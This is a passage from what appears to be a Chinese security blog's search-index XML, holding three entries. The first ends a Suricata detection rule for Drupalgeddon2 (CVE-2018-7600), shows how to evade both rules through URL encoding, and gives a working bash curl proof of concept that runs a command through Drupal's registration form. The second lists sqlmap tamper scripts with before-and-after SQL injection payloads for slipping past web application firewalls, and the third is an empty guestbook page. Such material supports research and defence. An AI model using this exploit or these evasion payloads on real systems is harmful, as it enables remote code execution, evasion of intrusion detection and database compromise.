string">"/(%23|#)(access_callback|pre_render|post_render|lazy_builder)/Pi"</span><span class="token punctuation">;</span> <span class="token punctuation">\</span>  reference: cve, <span class="token number">2018</span>-7600<span class="token punctuation">;</span> <span class="token punctuation">\</span>  reference: url, research.checkpoint.com/uncovering-drupalgeddon-2<span class="token punctuation">;</span> <span class="token punctuation">\</span>  classtype: attempted-admin<span class="token punctuation">;</span> <span class="token punctuation">\</span>  reference: url, github.com/ptresearch/AttackDetection<span class="token punctuation">;</span> <span class="token punctuation">\</span>  metadata: Open Ptsecurity.com ruleset<span class="token punctuation">;</span> <span class="token punctuation">\</span>  sid: <span class="token number">10002808</span><span class="token punctuation">;</span> <span class="token punctuation">\</span>  rev: <span class="token number">2</span><span class="token punctuation">;</span> <span class="token punctuation">\</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在重启Suricata后，我的攻击被成功报警：</p><p>可以看到，我们得到了两条日志：</p><blockquote><p>​    1.ATTACK [PTsecurity] Drupalgeddon2 &lt;8.3.9 &lt;8.4.6 &lt;8.5.1 RCE through registration form (CVE-2018-7600) [Priority: 1] {PROTO:006} 172.17.0.6:51702 -&gt; 172.17.0.1:8080</p><p>​    2.Possible Drupalgeddon2 attack [Priority: 3] {PROTO:006} 172.17.0.6:51702 -&gt; 172.17.0.1:8080</p></blockquote><h2 id="Bypass！"><a href="#Bypass！" class="headerlink" title="Bypass！"></a>Bypass！</h2><p>这两条规则其实都很容易绕过。首先，对于敏感字段form_id=user_register_form，我们可将其替换为如下内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">form%5bid<span class="token operator">=</span>user_register_form<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如上图所见，现在只有通用规则的警报。分析通用规则的正则表达式，我们可以看到它对#和%23敏感，但不涉及下划线的编码。因此，我们可以使用post%5frender代替post_render来绕过：</p><p>最后得出可绕过两个规则的PoC：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token assign-left variable">URL</span><span class="token operator">=</span><span class="token string">"/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax"</span><span class="token assign-left variable">QSTRING</span><span class="token operator">=</span><span class="token string">"form%5bid=user_register_form&amp;_drupal_ajax=1&amp;mail[#post%5frender][]=exec&amp;mail[#type]=markup&amp;mail[#markup]="</span><span class="token assign-left variable">COMMAND</span><span class="token operator">=</span><span class="token string">"id"</span><span class="token function">curl</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token variable">${QSTRING}</span><span class="token variable">${COMMAND}</span>"</span> <span class="token string">"http://172.17.0.1:8080<span class="token variable">$URL</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>转自<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap</title>
      <link href="/2020/02/01/sqlmap-tamper/"/>
      <url>/2020/02/01/sqlmap-tamper/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap-tamper"><a href="#sqlmap-tamper" class="headerlink" title="sqlmap_tamper"></a>sqlmap_tamper</h1><ol><li><p>apostrophemask.py    用UTF-8全角字符替换单引号字符</p></li><li><p>apostrophenullencode.py     用非法双字节unicode字符替换单引号字符</p></li><li><p>appendnullbyte.py    在payload末尾添加空字符编码</p></li><li><p>base64encode.py    对给定的payload全部字符使用Base64编码</p></li><li><p>between.py    分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</p></li><li><p>bluecoat.py    在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</p></li><li><p>chardoubleencode.py    对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</p></li><li><p>charencode.py    对给定的payload全部字符使用URL编码（不处理已经编码的字符）</p></li><li><p>charunicodeencode.py    对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</p></li><li><p>concat2concatws.py    用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</p></li><li><p>equaltolike.py    用“LIKE”运算符替换全部等于号“=”</p></li><li><p>greatest.py    用“GREATEST”函数替换大于号“&gt;”</p></li><li><p>halfversionedmorekeywords.py     在每个关键字之前添加MySQL注释</p></li><li><p>ifnull2ifisnull.py    用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</p></li><li><p>lowercase.py    用小写值替换每个关键字字符</p></li><li><p>modsecurityversioned.py     用注释包围完整的查询</p></li><li><p>modsecurityzeroversioned.py     用当中带有数字零的注释包围完整的查询</p></li><li><p>multiplespaces.py    在SQL关键字周围添加多个空格</p></li><li><p>nonrecursivereplacement.py     用representations替换预定义SQL关键字，适用于过滤器</p></li><li><p>overlongutf8.py    转换给定的payload当中的所有字符</p></li><li><p>percentage.py    在每个字符之前添加一个百分号</p></li><li><p>randomcase.py    随机转换每个关键字字符的大小写</p></li><li><p>randomcomments.py    向SQL关键字中插入随机注释</p></li><li><p>securesphere.py    添加经过特殊构造的字符串</p></li><li><p>sp_password.py    向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</p></li><li><p>space2comment.py    用“/**/”替换空格符</p></li><li><p>space2dash.py    用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符</p></li><li><p>space2hash.py    用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</p></li><li><p>space2morehash.py    用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</p></li><li><p>space2mssqlblank.py    用一组有效的备选字符集当中的随机空白符替换空格符</p></li><li><p>space2mssqlhash.py    用磅注释符“#”其次是一个换行符替换空格符</p></li><li><p>space2mysqlblank.py    用一组有效的备选字符集当中的随机空白符替换空格符</p></li><li><p>space2mysqldash.py    用破折号注释符“–”其次是一个换行符替换空格符</p></li><li><p>space2plus.py    用加号“+”替换空格符</p></li><li><p>space2randomblank.py    用一组有效的备选字符集当中的随机空白符替换空格符</p></li><li><p>unionalltounion.py    用“UNION SELECT”替换“UNION ALL SELECT”</p></li><li><p>unmagicquotes.py    用一个多字节组合%bf%27和末尾通用注释一起替换空格符</p></li><li><p>varnish.py    添加一个HTTP头“X-originating-IP”来绕过WAF</p></li><li><p>versionedkeywords.py    用MySQL注释包围每个非函数关键字</p></li><li><p>versionedmorekeywords.py     用MySQL注释包围每个关键字</p></li><li><p>xforwardedfor.py    添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</p></li><li><h3 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py"></a>apostrophemask.py</h3></li></ol><p>适用数据库：ALL<br> 作用：将引号替换为utf-8，用于过滤单引号<br> 使用脚本前：tamper(“1 AND ‘1’=’1”)<br> 使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p><ol start="2"><li><h3 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h3></li></ol><p>适用数据库：ALL<br> 作用：替换为base64编码<br> 使用脚本前：tamper(“1’ AND SLEEP(5)#”)<br> 使用脚本后：MScgQU5EIFNMRUVQKDUpIw==</p><ol start="3"><li><h3 id="multiplespaces-py"><a href="#multiplespaces-py" class="headerlink" title="multiplespaces.py"></a>multiplespaces.py</h3></li></ol><p>适用数据库：ALL<br> 作用：围绕sql关键字添加多个空格<br> 使用脚本前：tamper(‘1 UNION SELECT foobar’)<br> 使用脚本后：1 UNION SELECT foobar</p><ol start="4"><li><h3 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a>space2plus.py</h3></li></ol><p>适用数据库：ALL<br> 作用：用加号替换空格<br> 使用脚本前：tamper(‘SELECT id FROM users’)<br> 使用脚本后：SELECT+id+FROM+users</p><ol start="5"><li><h3 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a>nonrecursivereplacement.py</h3></li></ol><p>适用数据库：ALL<br> 作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）<br> 使用脚本前：tamper(‘1 UNION SELECT 2–’)<br> 使用脚本后：1 UNIOUNIONN SELESELECTCT 2–</p><ol start="6"><li><h3 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a>space2randomblank.py</h3></li></ol><p>适用数据库：ALL<br> 作用：将空格替换为其他有效字符<br> 使用脚本前：tamper(‘SELECT id FROM users’)<br> 使用脚本后：SELECT%0Did%0DFROM%0Ausers</p><ol start="7"><li><h3 id="unionalltounion-py"><a href="#unionalltounion-py" class="headerlink" title="unionalltounion.py"></a>unionalltounion.py</h3></li></ol><p>适用数据库：ALL<br> 作用：将union allselect 替换为unionselect<br> 使用脚本前：tamper(‘-1 UNION ALL SELECT’)<br> 使用脚本后：-1 UNION SELECT</p><ol start="8"><li><h3 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a>securesphere.py</h3></li></ol><p>适用数据库：ALL<br> 作用：追加特定的字符串<br> 使用脚本前：tamper(‘1 AND 1=1’)<br> 使用脚本后：1 AND 1=1 and ‘0having’=’0having’</p><ol start="9"><li><h3 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a>space2dash.py</h3></li></ol><p>适用数据库：ALL<br> 作用：将空格替换为–，并添加一个随机字符串和换行符<br> 使用脚本前：tamper(‘1 AND 9227=9227’)<br> 使用脚本后：1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227</p><ol start="10"><li><h3 id="space2mssqlblank-py"><a href="#space2mssqlblank-py" class="headerlink" title="space2mssqlblank.py"></a>space2mssqlblank.py</h3></li></ol><p>适用数据库：Microsoft SQL Server<br> 测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005<br> 作用：将空格随机替换为其他空格符号(‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)<br> 使用脚本前：tamper(‘SELECT id FROM users’)<br> 使用脚本后：SELECT%0Eid%0DFROM%07users</p><ol start="11"><li><h3 id="between-py"><a href="#between-py" class="headerlink" title="between.py"></a>between.py</h3></li></ol><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br> 作用：用NOT BETWEEN 0 AND #替换&gt;<br> 使用脚本前：tamper(‘1 AND A &gt; B–’)<br> 使用脚本后：1 AND A NOT BETWEEN 0 AND B–</p><ol start="12"><li><h3 id="percentage-py"><a href="#percentage-py" class="headerlink" title="percentage.py"></a>percentage.py</h3></li></ol><p>适用数据库：ASP<br> 测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0<br> 作用：在每个字符前添加一个%<br> 使用脚本前：tamper(‘SELECT FIELD FROM TABLE’)<br> 使用脚本</p><p>后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</p><ol start="13"><li><h3 id="sp-password-py"><a href="#sp-password-py" class="headerlink" title="sp_password.py"></a>sp_password.py</h3></li></ol><p>适用数据库：MSSQL<br> 作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password<br> 使用脚本前：tamper(‘1 AND 9227=9227– ‘)<br> 使用脚本后：1 AND 9227=9227– sp_password</p><ol start="14"><li><h3 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a>charencode.py</h3></li></ol><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br> 作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）<br> 使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br> 使用脚本</p><p>后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</p><ol start="15"><li><h3 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a>randomcase.py</h3></li></ol><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br> 作用：随机大小写<br> 使用脚本前：tamper(‘INSERT’)<br> 使用脚本后：INseRt</p><ol start="16"><li><h3 id="charunicodeencode-py"><a href="#charunicodeencode-py" class="headerlink" title="charunicodeencode.py"></a>charunicodeencode.py</h3></li></ol><p>适用数据库：ASP、ASP.NET<br> 测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3<br> 作用：适用字符串的unicode编码<br> 使用脚本前：tamper(‘SELECT FIELD%20FROM TABLE’)<br> 使用脚本</p><p>后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</p><ol start="17"><li><h3 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a>space2comment.py</h3></li></ol><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br> 作用：将空格替换为/<strong>/<br> 使用脚本前：tamper(‘SELECT id FROM users’)<br> 使用脚本后：SELECT/</strong>/id/<strong>/FROM/</strong>/users</p><ol start="18"><li><h3 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h3></li></ol><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5<br> 作用：将=替换为LIKE<br> 使用脚本前：tamper(‘SELECT * FROM users WHERE id=1’)<br> 使用脚本后：SELECT * FROM users WHERE id LIKE 1</p><ol start="19"><li><h3 id="equaltolike-py-1"><a href="#equaltolike-py-1" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h3></li></ol><p>测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br> 作用：将&gt;替换为GREATEST，绕过对&gt;的过滤<br> 使用脚本前：tamper(‘1 AND A &gt; B’)<br> 使用脚本后：1 AND GREATEST(A,B+1)=A</p><ol start="20"><li><h3 id="ifnull2ifisnull-py"><a href="#ifnull2ifisnull-py" class="headerlink" title="ifnull2ifisnull.py"></a>ifnull2ifisnull.py</h3></li></ol><p>适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)<br> 测试通过数据库：MySQL 5.0 and 5.5<br> 作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤<br> 使用脚本前：tamper(‘IFNULL(1, 2)’)<br> 使用脚本后：IF(ISNULL(1),2,1)</p><ol start="21"><li><h3 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a>modsecurityversioned.py</h3></li></ol><p>适用数据库：MySQL<br> 测试通过数据库：MySQL 5.0<br> 作用：过滤空格，使用mysql内联注释的方式进行注入<br> 使用脚本前：tamper(‘1 AND 2&gt;1–’)<br> 使用脚本后：1 /<em>!30874AND 2&gt;1</em>/–</p><ol start="22"><li><h3 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py"></a>space2mysqlblank.py</h3></li></ol><p>适用数据库：MySQL<br> 测试通过数据库：MySQL 5.1<br> 作用：将空格替换为其他空格符号(‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)<br> 使用脚本前：tamper(‘SELECT id FROM users’)<br> 使用脚本后：SELECT%0Bid%0DFROM%0Cusers</p><ol start="23"><li><h3 id="modsecurityzeroversioned-py"><a href="#modsecurityzeroversioned-py" class="headerlink" title="modsecurityzeroversioned.py"></a>modsecurityzeroversioned.py</h3></li></ol><p>适用数据库：MySQL<br> 测试通过数据库：MySQL 5.0<br> 作用：使用内联注释方式（/<em>!00000</em>/）进行注入<br> 使用脚本前：tamper(‘1 AND 2&gt;1–’)<br> 使用脚本后：1 /<em>!00000AND 2&gt;1</em>/–</p><ol start="24"><li><h3 id="space2mysqldash-py"><a href="#space2mysqldash-py" class="headerlink" title="space2mysqldash.py"></a>space2mysqldash.py</h3></li></ol><p>适用数据库：MySQL、MSSQL<br> 作用：将空格替换为 – ，并追随一个换行符<br> 使用脚本前：tamper(‘1 AND 9227=9227’)<br> 使用脚本后：1–%0AAND–%0A9227=9227</p><ol start="25"><li><h3 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py"></a>bluecoat.py</h3></li></ol><p>适用数据库：Blue Coat SGOS<br> 测试通过数据库：MySQL 5.1,、SGOS<br> 作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换=<br> 使用脚本前：tamper(‘SELECT id FROM users where id = 1’)<br> 使用脚本后：SELECT%09id FROM users where id LIKE 1</p><ol start="26"><li><h3 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h3></li></ol><p>适用数据库：MySQL<br> 测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11<br> 作用：注释绕过<br> 使用脚本前：tamper(‘1 UNION ALL SELECT NULL, NULL, </p><p>CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#’)<br> 使用脚本后：1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/,</p><p>CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</p><ol start="27"><li><h3 id="halfversionedmorekeywords-py"><a href="#halfversionedmorekeywords-py" class="headerlink" title="halfversionedmorekeywords.py"></a>halfversionedmorekeywords.py</h3></li></ol><p>适用数据库：MySQL &lt; 5.1<br> 测试通过数据库：MySQL 4.0.18/5.0.22<br> 作用：在每个关键字前添加mysql版本注释<br> 使用脚本前：tamper(“value’ UNION ALL SELECT </p><p>CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS </p><p>CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND </p><p>‘QDWa’=’QDWa”)<br> 使用脚本后：</p><p>value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa</p><ol start="28"><li><h3 id="space2morehash-py"><a href="#space2morehash-py" class="headerlink" title="space2morehash.py"></a>space2morehash.py</h3></li></ol><p>适用数据库：MySQL &gt;= 5.1.13<br> 测试通过数据库：MySQL 5.1.41<br> 作用：将空格替换为#，并添加一个随机字符串和换行符<br> 使用脚本前：tamper(‘1 AND 9227=9227’)<br> 使用脚本后：</p><p>1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227</p><ol start="29"><li><h3 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py"></a>apostrophenullencode.py</h3></li></ol><p>适用数据库：ALL<br> 作用：用非法双字节Unicode字符替换单引号<br> 使用脚本前：tamper(“1 AND ‘1’=’1”)<br> 使用脚本后：1 AND %00%271%00%27=%00%271</p><ol start="30"><li><h3 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py"></a>appendnullbyte.py</h3></li></ol><p>适用数据库：ALL<br> 作用：在有效载荷的结束位置加载null字节字符编码<br> 使用脚本前：tamper(‘1 AND 1=1’)<br> 使用脚本后：1 AND 1=1%00</p><ol start="31"><li><h3 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a>chardoubleencode.py</h3></li></ol><p>适用数据库：ALL<br> 作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符）<br> 使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br> 使用脚本</p><p>后：%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</p><ol start="32"><li><h3 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a>unmagicquotes.py</h3></li></ol><p>适用数据库：ALL<br> 作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格<br> 使用脚本前：tamper(“1’ AND 1=1”)<br> 使用脚本后：1%bf%27 AND 1=1–</p><ol start="33"><li><h3 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a>randomcomments.py</h3></li></ol><p>适用数据库：ALL<br> 作用：用注释符分割sql关键字<br> 使用脚本前：tamper(‘INSERT’)<br> 使用脚本后：I/<strong>/N/</strong>/SERT</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逐梦</title>
      <link href="/2019/09/07/0xdadream/"/>
      <url>/2019/09/07/0xdadream/</url>
      
        <content type="html"><![CDATA[<h2 id="这一页用来留言，交流"><a href="#这一页用来留言，交流" class="headerlink" title="这一页用来留言，交流"></a>这一页用来留言，交流</h2>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
